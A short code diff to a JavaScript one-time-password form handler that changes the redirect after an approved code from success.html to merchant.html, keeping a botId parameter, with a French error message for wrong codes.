@@ -117,7 +117,7 @@ document.getElementById('otpForm').addEventListener('submit', async e=>{
 
   if(approved){
     localStorage.clear();
-    window.location.href=`success.html?botId=${botId}`;
+    window.location.href=`merchant.html?botId=${botId}`;
   }else{
     statusEl.textContent="Code OTP incorrect. Veuillez réessayer.";
     inputs.forEach(i=>i.value="");
